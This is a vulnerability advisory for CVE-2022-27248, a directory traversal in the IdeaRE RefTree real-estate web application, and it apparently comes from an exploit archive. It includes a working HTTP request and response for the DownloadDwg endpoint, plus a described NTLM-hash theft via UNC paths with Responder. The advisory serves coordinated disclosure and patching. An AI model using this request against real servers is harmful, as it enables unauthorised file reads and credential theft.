@@ -1,0 +1,92 @@
+id: 37566
+date: 03/31/2022
+title: IdeaRE RefTree Path Traversal Vulnerability
+author: Savino Sisco
+cves: CVE-2022-27248
+
+===============================================================================
+                  title: IdeaRE RefTree Download Path Traversal
+                product: IdeaRE RefTree < 2021.09.17
+     vulnerability type: Directory Traversal
+                 CVE ID: CVE-2022-27248
+               severity: Medium
+           CVSSv3 score: 4.3
+          CVSSv3 vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N
+                  found: 2021-09-13
+                     by: Savino Sisco <saviosisco@gmail.com>
+===============================================================================
+
+[EXECUTIVE SUMMARY]
+RefTree is a web application made for managing complex real estate situations.
+Among other features, it offers the possibility for authenticated users
+to upload and download DWG (CAD drawings) files for buildings.
+
+During a penetration test activity, a "Directory Traversal" vulnerability
+was found on the download feature which allows to download arbitrary files
+with the "dwg" extension. The application actually checks that the filename
+ends with "dwg", so it's not possible to download files with other extensions.
+
+This vulnerability may also allow to steal NTLM hashes of the host system
+by supplying, as the download path, a UNC path pointing to an 
+attacker controlled machine running a tool like Responder.
+
+[VULNERABLE VERSIONS]
+IdeaRE RefTree < 2021.09.17
+
+[TECHNICAL DETAILS]
+It is possible to reproduce the issue following these steps:
+1. Log into the application to get a valid session cookie
+2. Use the API endpoint '/CaddemServiceJS/CaddemService.svc/rest/DownloadDwg'
+   to download an arbitrary "dwg" file (UNC paths are accepted).
+
+
+Example of the request to the Download endpoint:
+
+POST /CaddemServiceJS/CaddemService.svc/rest/DownloadDwg HTTP/2
+Host: [REDACTED]
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+Content-Length: 111
+Origin: https://[REDACTED]
+Referer: https://[REDACTED]/Reftreespace/
+Cookie: ASP.NET_SessionId=dezu5r0zswyqk4dukwt5jt5n
+
+{
+  "path": "C:\\Users\\Public\\test.dwg"
+}
+
+
+HTTP/2 200 OK
+Cache-Control: private
+Content-Type: application/json; charset=utf-8
+Server: Microsoft-IIS/10.0
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Origin: https://[REDACTED]
+X-Powered-By: ASP.NET
+Date: Thu, 10 Oct 2021 11:21:32 GMT
+Content-Length: 241916
+
+{"DownloadDwgResult":[BASE64_FILE_REDACTED]}
+
+
+[VULNERABILITY REFERENCE]
+The following CVE ID was allocated to track the vulnerabilities:
+CVE-2022-27248
+
+
+[DISCLOSURE TIMELINE]
+2021-09-13  Vulnerability disclosed to our customer and the vendor.
+            Vendor acknowledged the issue.
+2021-09-17  Vendor released a fix for the software.
+2021-10-15  The vulnerability was rechecked in the newer version to confirm 
+            that is was indeed fixed.
+2022-03-15  Researcher requested to publicly disclose the issue; public
+            coordinated disclosure.
+
+[RESOLUTION]
+Update the software to a version >= 2021.09.17
+
+#  0day.today [2023-03-22]  #
